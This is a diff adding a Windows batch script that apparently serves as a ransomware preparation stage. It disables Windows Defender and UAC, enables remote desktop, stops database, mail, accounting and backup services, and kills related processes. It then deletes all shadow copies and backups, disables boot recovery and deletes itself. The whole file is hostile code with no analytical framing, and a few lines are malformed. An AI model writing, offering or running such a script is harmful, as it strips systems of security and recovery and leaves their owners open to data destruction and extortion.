@@ -1,0 +1,103 @@
+powershell Set-MpPreference -DisableRealtimeMonitoring $true
+powershell Set-MpPreference -MAPSReporting 0
+powershell Set-MpPreference -SubmitSamplesConsent 2
+powershell Set-MpPreference -Disable-WindowsOptionalFeature -Online -FeatureName "Client-UnifiedWriteFilter" –All
+taskkill /F /IM MSASCuiL.exe
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d 0x1 /f
+REG ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableNotificationCenter" /t REG_DWORD /d 0x1 /f
+REG DELETE "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 0x1 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d 0x0 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 0x0 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 0x1 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0x1 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 0x1 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "LocalSettingOverrideSpynetReporting" /t REG_DWORD /d 0x0 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 0x2 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v "NotificationSuppress" /t REG_DWORD /d 0x1 /f
+REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\uwfvol" /d 4 /f
+REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{71a27cdd-812a-11d0-bec7-08002be2092f}\Lower Filters
+pause
+add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "AllowMultipleTSSessions" /t REG_DWORD /d 0x1 /f
+reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "fSingleSessionPerUser" /t REG_DWORD /d 0x0 /f
+@echo off
+
+net stop MSSQLServerADHelper100
+net stop MSSQL$ISARS
+net stop MSSQL$MSFW
+net stop SQLAgent$ISARS
+net stop SQLAgent$MSFW
+net stop SQLBrowser
+net stop ReportServer$ISARS
+net stop SQLWriter
+net stop WinDefend
+net stop mr2kserv
+net stop MSExchangeADTopology
+net stop MSExchangeFBA
+net stop MSExchangeIS
+net stop MSExchangeSA
+net stop ShadowProtectSvc
+net stop SPAdminV4
+net stop SPTimerV4
+net stop SPTraceV4
+net stop SPUserCodeV4
+net stop SPWriterV4
+net stop SPSearch4
+net stop MSSQLServerADHelper100
+net stop IISADMIN
+net stop firebirdguardiandefaultinstance
+net stop ibmiasrw
+net stop QBCFMonitorService
+net stop QBVSS
+net stop QBPOSDBServiceV12
+net stop "IBM Domino Server (CProgramFilesIBMDominodata)"
+net stop "IBM Domino Diagnostics (CProgramFilesIBMDomino)"
+net stop IISADMIN
+net stop "Simply Accounting Database Connection Manager"
+net stop QuickBooksDB1
+net stop QuickBooksDB2
+net stop QuickBooksDB3
+net stop QuickBooksDB4
+net stop QuickBooksDB5
+net stop QuickBooksDB6
+net stop QuickBooksDB7
+net stop QuickBooksDB8
+net stop QuickBooksDB9
+net stop QuickBooksDB10
+net stop QuickBooksDB11
+net stop QuickBooksDB12
+net stop QuickBooksDB13
+net stop QuickBooksDB14
+net stop QuickBooksDB15
+net stop QuickBooksDB16
+net stop QuickBooksDB17
+net stop QuickBooksDB18
+net stop QuickBooksDB19
+net stop QuickBooksDB20
+net stop QuickBooksDB21
+net stop QuickBooksDB22
+net stop QuickBooksDB23
+net stop QuickBooksDB24
+net stop QuickBooksDB25
+taskkill /f /im mysql*
+taskkill /f /im IBM*
+taskkill /f /im bes10*
+taskkill /f /im black*
+taskkill /f /im sql
+taskkill /f /im store.exe
+taskkill /f /im sql*
+taskkill /f /im vee*
+taskkill /f /im postg*
+taskkill /f /im sage*
+REG add "HKLM\SYSTEM\CurrentControlSet\services\WinDefend" /v Start /t REG_DWORD /d 4 /f
+REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t reg_dword /d 0 /f
+wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0
+wbadmin DELETE BACKUP -keepVersions:0
+wmic SHADOWCOPY DELETE
+vssadmin Delete Shadows /All /Quiet
+bcdedit /set {default} recoveryenabled No
+bcdedit /set {default} bootstatuspolicy ignoreallfailures
+vssadmin list shadows
+del %0
